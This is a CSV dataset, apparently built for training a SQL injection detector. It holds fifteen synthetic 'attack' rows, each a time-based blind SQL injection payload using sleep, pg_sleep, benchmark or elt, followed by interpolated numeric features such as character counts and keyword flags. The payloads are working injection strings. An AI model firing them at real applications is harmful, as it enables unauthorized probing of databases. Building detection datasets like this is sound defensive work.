id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000186,attack,time,1'  )   where 2928  =  2928 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,nearest_attack_euclidean,R000222,0.48134350437791235,105.17626730290824,28.0,3.3371664797552993,33.35253460581648,10.0,49.0,12.82373269709176,0.3170888870273817,0.09507972389675809,0.46589064709411465,0.12194074198174554,0.8237326970917607,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.0,0.0,0.0,0.0,2.0,0.8237326970917607,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.8237326970917607,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.82373269709176
SMOTE_000187,attack,time,select pg_sleep  (  5  )   and   (  'vnss' like 'vnss,nearest_attack_euclidean,R000045,0.7151131859177543,52.29262690341734,18.528417935611564,3.4942131165341914,27.528417935611564,1.0,17.0,6.764208967805781,0.5263443763365008,0.019134857772295344,0.3252925821290208,0.12922818376218304,3.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.7642089678057816,0.0,2.220446049250313e-16,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.23579103219421832,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2357910321942183
SMOTE_000188,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'ukoc' like 'ukoc,nearest_attack_euclidean,R000057,0.07663565777806186,85.0,28.90713866141685,3.8690015856851145,33.930353996062635,10.0,31.046430669291574,10.023215334645787,0.3991806352477958,0.11764705882352941,0.36525212552107733,0.1179201804075975,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.023215334645787,0.0,4.0,0.0,1.0,0.0,1.023215334645787,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.023215334645787,0.9767846653542128,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000189,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R000221,0.7189925827160383,89.06508062628012,29.338756718856676,3.672637550447219,32.33875671885667,10.0,36.879432110281755,9.846891797141692,0.365538234329396,0.11325949203855357,0.4114990812822909,0.1097031923497596,1.508135078285015,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.508135078285015,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.8306216405716617,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.16937835942833834,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1693783594283382
SMOTE_000190,attack,time,"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000027,0.4367357816297454,88.2599082604739,24.440528143307283,3.3052641355948,17.792950657953114,19.17621125732291,39.76211257322914,11.52863377196874,0.20115548365457647,0.21900093538316717,0.4495567073120992,0.1302868736501572,0.0,1.264316885984371,0.0,0.0,0.0,1.0881056286614568,0.0,7.26431688598437,0.0,0.0,1.0,1.0881056286614568,0.0,1.0,0.0,0.9118943713385431,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.08810562866145688,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0881056286614568
SMOTE_000191,attack,time,1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000099,0.6292079272283411,86.12382117046508,24.296432938924404,3.1346146634402228,29.53095529261627,2.0,42.06191058523254,12.53095529261627,0.34304111230628964,0.023260278076572424,0.4883698609617138,0.1453287486554241,1.0,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.765477646308135,0.7654776463081345,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.23452235369186553,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.234522353691865
SMOTE_000192,attack,time,"1%'   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000186,0.08337482227554747,82.17782783445845,27.982217216554155,3.5845339977883266,16.03556556689169,21.0,34.07113113378338,11.07113113378338,0.19513138005484934,0.25560254712041,0.41460585983545195,0.13466021298928876,1.0533483503375358,-1.1102230246251565e-16,0.0,0.0,0.0,1.0177827834458453,0.0,6.0,1.0177827834458453,0.0,1.0,1.0177827834458453,1.0,0.0,0.0,0.9822172165541545,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,1.0,0.01778278344584522,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0177827834458446
SMOTE_000193,attack,time,1   )    )     )   rlike sleep  (  5  )   and    (    (     (  6790  =  6790,nearest_attack_euclidean,R000279,1.8742334894859676,64.81394675624892,18.709301548797953,2.813945573308278,11.709301548797953,10.0,35.39534365865301,7.709301548797953,0.18350673944142326,0.16101592958881863,0.5363769633638623,0.11910036760589582,0.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,6.279068731730603,0.0,0.0,0.4302328170673494,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5697671829326507,0.4302328170673493,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000194,attack,time,1  )   where 9821  =  9821 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,nearest_attack_euclidean,R000179,0.5733943516616096,109.54575661242953,25.745535096647874,3.2349834314743977,34.61830264497181,10.0,52.491070193295755,12.43638377416197,0.3156344381137363,0.09170169770246048,0.4789236593632068,0.11374020482059638,0.0,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.43638377416197,0.0,0.0,0.0,2.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000195,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000244,1.7993021653239858,52.53959802456524,18.53959802456524,3.118828082193197,10.999999999999998,10.0,24.0,7.539598024565241,0.2093847684070328,0.1903497894609389,0.45683949470625335,0.14342594742577497,0.5395980245652409,0.46040197543475897,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,1.0,0.5395980245652409,0.460401975434759,0.0,0.539598024565241,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
SMOTE_000196,attack,time,"1'+  (  select 'dbvq' where 2045  =  2045 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",nearest_attack_euclidean,R000311,0.6095424388914976,107.8223343181933,31.835533136361338,3.980751435476167,31.671066272722676,27.493400590915982,35.65786745455465,13.0,0.29393269300727143,0.25488908850440506,0.3305749429656693,0.12060327552265412,2.835533136361339,-1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.164466863638661,0.0,0.0,1.0,3.164466863638661,1.0,0.0,0.0,0.8355331363613386,0.0,1.0,1.0,0.0,0.0,0.9999999999999999,0.0,1.0,0.0,1.0,0.0,0.16446686363866125,0.8355331363613387,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000197,attack,time,1'   )    )    or sleep  (  5  )   and    (    (   'zxik'  =  'zxik,nearest_attack_euclidean,R000213,0.11255399375406967,67.48491156913289,20.12930975176877,2.8921779296837147,18.096982313826576,2.2586195035375383,36.064654875884386,11.064654875884385,0.26825071109974313,0.03282811860188373,0.5349244740071842,0.16399669629118893,4.0,-1.1102230246251565e-16,0.0,0.0,0.0,1.0323274379421923,0.0,6.0,0.0,0.0,0.03232743794219217,1.0323274379421923,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000198,attack,time,1'+  (  select 'sbji' where 7989  =  7989 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo   )    )   +',nearest_attack_euclidean,R000053,1.2142048248704196,125.10983273797808,30.389016726202193,3.5175319986056444,44.22196654759561,10.0,53.66589964278684,17.221966547595617,0.35370276929391053,0.08005352567391175,0.42868545505782885,0.13755824997434885,3.610983273797808,-1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,9.610983273797807,0.0,0.0,0.0,3.6109832737978076,1.0,0.0,0.0,0.3890167262021922,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,1.0,1.0,0.3890167262021922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.3890167262021915
SMOTE_000199,attack,time,"1""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""cwwv"" like ""cwwv",nearest_attack_euclidean,R000249,0.5134942963536773,83.22308644299851,22.22308644299851,3.315926511740634,25.09360085016493,8.964115257331349,37.03588474266865,12.129485592833582,0.3009862979084086,0.106952810925801,0.4461207580030861,0.14594013316270432,0.0,4.0,0.0,0.0,0.0,1.0,0.0,6.258971185667162,0.0,0.0,0.8705144071664186,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000200,attack,time,1'   )    )    as nsfx where 9553  =  9553 rlike sleep  (  5  )  --,nearest_attack_euclidean,R000225,0.6712716922487825,64.80385167433856,22.45096291858464,3.4446814825073764,21.0,10.0,26.352888755753916,7.45096291858464,0.32509970018691886,0.15480938104138992,0.40554912718290737,0.1145417915887838,0.7254814592923197,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.7254814592923196,0.0,0.0,0.0,3.0,0.7254814592923197,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.9999999999999998
